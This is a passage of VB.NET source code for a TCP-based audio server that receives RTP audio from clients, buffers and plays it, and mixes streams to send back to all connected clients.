            AddToLog("OnServerClientConnected@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub SendConfigurationToClient(ByVal data As ServerThreadData)
        Dim bytesConfig As [Byte]() = m_Encoding.GetBytes([String].Format("SamplesPerSecond:{0}", SamplesPerSecondServer))
        data.ServerThread.Send(m_PrototolClient.ToBytes(bytesConfig))
    End Sub
    Private Sub OnServerClientDisconnected(ByVal st As ServerThread, ByVal info As String)
        Try
            If m_DictionaryServerDatas.ContainsKey(st) Then
                Dim data As ServerThreadData = m_DictionaryServerDatas(st)
                data.Dispose()
                SyncLock LockerDictionary
                    m_DictionaryServerDatas.Remove(st)
                End SyncLock
            End If
            DictionaryMixed.Remove(st)
        Catch ex As Exception
            AddToLog("OnServerClientDisconnected@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StartTimerMixed()
        If m_TimerMixed Is Nothing Then
            m_TimerMixed = New WinSound.EventTimer()
            AddHandler m_TimerMixed.TimerTick, AddressOf OnTimerSendMixedDataToAllClients
            m_TimerMixed.Start(20, 0)
        End If
    End Sub
    Private Sub StopTimerMixed()
        If m_TimerMixed IsNot Nothing Then
            m_TimerMixed.[Stop]()
            RemoveHandler m_TimerMixed.TimerTick, AddressOf OnTimerSendMixedDataToAllClients
            m_TimerMixed = Nothing
        End If
    End Sub
    Private Sub OnServerDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
        If m_DictionaryServerDatas.ContainsKey(st) Then
            Dim stData As ServerThreadData = m_DictionaryServerDatas(st)
            If stData.Protocol IsNot Nothing Then
                stData.Protocol.Receive_LH(st, data)
            End If
        End If
    End Sub
    Private Sub DeleteAllServerThreadDatas()
        SyncLock LockerDictionary
            Try
                For Each info As ServerThreadData In m_DictionaryServerDatas.Values
                    info.Dispose()
                Next
                m_DictionaryServerDatas.Clear()
            Catch ex As Exception
                AddToLog("DeleteAllServerThreadDatas@Main", "Error: " & ex.Message, True)
            End Try
        End SyncLock
    End Sub
    Private ReadOnly Property IsServerRunning() As Boolean
        Get
            If m_Server IsNot Nothing Then
                Return m_Server.State = TCPServer.ListenerState.Started
            End If
            Return False
        End Get
    End Property
    Private ReadOnly Property IsClientConnected() As Boolean
        Get
            If m_Client IsNot Nothing Then
                Return m_Client.Connected
            End If
            Return False
        End Get
    End Property
End Class
Public Class ServerThreadData
    Public Sub New()
    End Sub
    Public ServerThread As ServerThread
    Public Player As WinSound.Player
    Public JitterBuffer As WinSound.JitterBuffer
    Public Protocol As WinSound.Protocol
    Public SamplesPerSecond As Integer = 8000
    Public BitsPerSample As Integer = 16
    Public SoundBufferCount As Integer = 8
    Public JitterBufferCount As UInteger = 20
    Public JitterBufferMilliseconds As UInteger = 20
    Public Channels As Integer = 1
    Private IsInitialized As Boolean = False
    Public IsMute As Boolean = False
    Public Shared IsMuteAll As Boolean = False
    Public Sub Init(ByVal st As ServerThread, ByVal soundDeviceName As String, ByVal samplesPerSecond As Integer, ByVal bitsPerSample As Integer, ByVal channels As Integer, ByVal soundBufferCount As Integer,
     ByVal jitterBufferCount As UInteger, ByVal jitterBufferMilliseconds As UInteger)
        Me.ServerThread = st
        Me.SamplesPerSecond = samplesPerSecond
        Me.BitsPerSample = bitsPerSample
        Me.Channels = channels
        Me.SoundBufferCount = soundBufferCount
        Me.JitterBufferCount = jitterBufferCount
        Me.JitterBufferMilliseconds = jitterBufferMilliseconds
        Me.Player = New WinSound.Player()
        Me.Player.Open(soundDeviceName, samplesPerSecond, bitsPerSample, channels, soundBufferCount)
        If jitterBufferCount >= 2 Then
            Me.JitterBuffer = New WinSound.JitterBuffer(st, jitterBufferCount, jitterBufferMilliseconds)
            AddHandler Me.JitterBuffer.DataAvailable, AddressOf OnJitterBufferDataAvailable
            Me.JitterBuffer.Start()
        End If
        Me.Protocol = New WinSound.Protocol(WinSound.ProtocolTypes.LH, Encoding.[Default])
        AddHandler Me.Protocol.DataComplete, AddressOf OnProtocolDataComplete
        AudioServer.DictionaryMixed(st) = New Queue(Of List(Of Byte))()
        IsInitialized = True
    End Sub
    Public Sub Dispose()
        If Protocol IsNot Nothing Then
            RemoveHandler Me.Protocol.DataComplete, AddressOf OnProtocolDataComplete
            Me.Protocol = Nothing
        End If

        If JitterBuffer IsNot Nothing Then
            JitterBuffer.[Stop]()
            RemoveHandler JitterBuffer.DataAvailable, AddressOf OnJitterBufferDataAvailable
            Me.JitterBuffer = Nothing
        End If
        If Player IsNot Nothing Then
            Player.Close()
            Me.Player = Nothing
        End If
        IsInitialized = False
    End Sub
    Private Sub OnProtocolDataComplete(ByVal sender As [Object], ByVal bytes As [Byte]())
        If IsInitialized Then
            If ServerThread IsNot Nothing AndAlso Player IsNot Nothing Then
                Try
                    If Player.Opened Then
                        Dim rtp As New WinSound.RTPPacket(bytes)
                        If rtp.Data IsNot Nothing Then
                            If JitterBuffer IsNot Nothing AndAlso JitterBuffer.Maximum >= 2 Then
                                JitterBuffer.AddData(rtp)
                            Else
                                If IsMuteAll = False AndAlso IsMute = False Then
                                    Dim linearBytes As [Byte]() = WinSound.Utils.MuLawToLinear(rtp.Data, Me.BitsPerSample, Me.Channels)
                                    Player.PlayData(linearBytes, False)
                                End If
                            End If
                        End If
                    End If
                Catch ex As Exception

                    IsInitialized = False
                End Try
            End If
        End If
    End Sub
    Private Sub OnJitterBufferDataAvailable(ByVal sender As [Object], ByVal rtp As WinSound.RTPPacket)
        Try
            If Player IsNot Nothing Then
                Dim linearBytes As [Byte]() = WinSound.Utils.MuLawToLinear(rtp.Data, BitsPerSample, Channels)

                If IsMuteAll = False AndAlso IsMute = False Then
                    Player.PlayData(linearBytes, False)
                End If
                Dim q As Queue(Of List(Of [Byte])) = AudioServer.DictionaryMixed(sender)
                If q.Count < 10 Then
                    AudioServer.DictionaryMixed(sender).Enqueue(New List(Of [Byte])(linearBytes))
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
End Class
Public Class TCPServer
    Public Sub New()
    End Sub
    Private m_endpoint As IPEndPoint
    Private m_tcpip As TcpListener
    Private m_ThreadMainServer As Thread
    Private m_State As ListenerState
    Private m_threads As New List(Of ServerThread)()
    Public Delegate Sub DelegateClientConnected(ByVal st As ServerThread)
    Public Delegate Sub DelegateClientDisconnected(ByVal st As ServerThread, ByVal info As String)
    Public Delegate Sub DelegateDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
    Public Event ClientConnected As DelegateClientConnected
    Public Event ClientDisconnected As DelegateClientDisconnected
    Public Event DataReceived As DelegateDataReceived
    Public Enum ListenerState
        None
        Started
        Stopped
        [Error]
    End Enum
    Public ReadOnly Property Clients() As List(Of ServerThread)
        Get
            Return m_threads
        End Get
    End Property
    Public ReadOnly Property State() As ListenerState
        Get
            Return m_State
        End Get
    End Property
    Public ReadOnly Property Listener() As TcpListener
        Get
            Return Me.m_tcpip
        End Get
    End Property
    Public Sub Start(ByVal strIPAdress As String, ByVal Port As Integer)
        m_endpoint = New IPEndPoint(IPAddress.Parse(strIPAdress), Port)
        m_tcpip = New TcpListener(m_endpoint)
        If m_tcpip Is Nothing Then
            Return
        End If
        Try
            m_tcpip.Start()
            m_ThreadMainServer = New Thread(AddressOf Run)
            m_ThreadMainServer.Start()
            Me.m_State = ListenerState.Started
        Catch ex As Exception
            m_tcpip.[Stop]()
            Me.m_State = ListenerState.[Error]
            Throw ex
        End Try
    End Sub
    Private Sub Run()
        While True
            Dim client As TcpClient = m_tcpip.AcceptTcpClient()
            Dim st As New ServerThread(client)
            AddHandler st.DataReceived, New ServerThread.DelegateDataReceived(AddressOf OnDataReceived)
            AddHandler st.ClientDisconnected, New ServerThread.DelegateClientDisconnected(AddressOf OnClientDisconnected)
            OnClientConnected(st)
            Try
                client.Client.BeginReceive(st.ReadBuffer, 0, st.ReadBuffer.Length, SocketFlags.None, AddressOf st.Receive, client.Client)
            Catch ex As Exception

            End Try
        End While
    End Sub
    Public Function Send(ByVal data As [Byte]()) As Integer
        Dim list As New List(Of ServerThread)(m_threads)
        For Each sv As ServerThread In list
            Try
                If data.Length > 0 Then
                    sv.Send(data)
                End If
            Catch generatedExceptionName As Exception
            End Try
        Next
        Return m_threads.Count
    End Function
    Private Sub OnDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
        RaiseEvent DataReceived(st, data)
    End Sub
    Private Sub OnClientDisconnected(ByVal st As ServerThread, ByVal info As String)
        m_threads.Remove(st)
        RaiseEvent ClientDisconnected(st, info)
    End Sub
    Private Sub OnClientConnected(ByVal st As ServerThread)
        If Not m_threads.Contains(st) Then
            m_threads.Add(st)
        End If
        RaiseEvent ClientConnected(st)
    End Sub
    Public Sub [Stop]()
        Try
            If m_ThreadMainServer IsNot Nothing Then
                m_ThreadMainServer.Abort()
                System.Threading.Thread.Sleep(100)
            End If
            Dim en As IEnumerator = m_threads.GetEnumerator()
            While en.MoveNext()
                Dim st As ServerThread = DirectCast(en.Current, ServerThread)
                st.[Stop]()
                RaiseEvent ClientDisconnected(st, "Verbindung wurde beendet")
            End While
            If m_tcpip IsNot Nothing Then
                m_tcpip.[Stop]()
                m_tcpip.Server.Close()
            End If
            m_threads.Clear()
            Me.m_State = ListenerState.Stopped
        Catch generatedExceptionName As Exception
            Me.m_State = ListenerState.[Error]
        End Try
    End Sub
End Class
Public Class ServerThread
    Private m_IsStopped As Boolean = False
    Private m_Connection As TcpClient = Nothing
    Public ReadBuffer As Byte() = New Byte(1023) {}
    Public IsMute As Boolean = False
    Public Name As [String] = ""
    Public Delegate Sub DelegateDataReceived(ByVal st As ServerThread, ByVal data As [Byte]())
    Public Event DataReceived As DelegateDataReceived
    Public Delegate Sub DelegateClientDisconnected(ByVal sv As ServerThread, ByVal info As String)
    Public Event ClientDisconnected As DelegateClientDisconnected
    Public ReadOnly Property Client() As TcpClient
        Get
            Return m_Connection
        End Get
    End Property
    Public ReadOnly Property IsStopped() As Boolean
        Get
            Return m_IsStopped
        End Get
    End Property
    Public Sub New(ByVal connection As TcpClient)
        Me.m_Connection = connection
    End Sub
    Public Sub Receive(ByVal ar As IAsyncResult)
        Try
            If Me.m_Connection.Client.Connected = False Then
                Return
            End If
            If ar.IsCompleted Then
                Dim bytesRead As Integer = m_Connection.Client.EndReceive(ar)
                If bytesRead > 0 Then
                    Dim data As [Byte]() = New Byte(bytesRead - 1) {}
                    System.Array.Copy(ReadBuffer, 0, data, 0, bytesRead)
                    RaiseEvent DataReceived(Me, data)
                    m_Connection.Client.BeginReceive(ReadBuffer, 0, ReadBuffer.Length, SocketFlags.None, AddressOf Receive, m_Connection.Client)
                Else
                    HandleDisconnection("CONEXION TERMINADA")
                End If
            End If
        Catch ex As Exception
            HandleDisconnection(ex.Message)
        End Try
    End Sub
    Public Sub HandleDisconnection(ByVal reason As String)
        m_IsStopped = True
        RaiseEvent ClientDisconnected(Me, reason)
    End Sub
    Public Sub Send(ByVal data As [Byte]())
        Try
            If Me.m_IsStopped = False Then
                Dim ns As NetworkStream = Me.m_Connection.GetStream()
                SyncLock ns
                    ns.Write(data, 0, data.Length)
                End SyncLock
            End If
        Catch ex As Exception
            Me.m_Connection.Close()
            Me.m_IsStopped = True
            RaiseEvent ClientDisconnected(Me, ex.Message)
            Throw ex
        End Try
    End Sub
    Public Sub [Stop]()
        If m_Connection.Client.Connected = True Then
            m_Connection.Client.Disconnect(False)
        End If
        Me.m_IsStopped = True
    End Sub
End Class
#End Region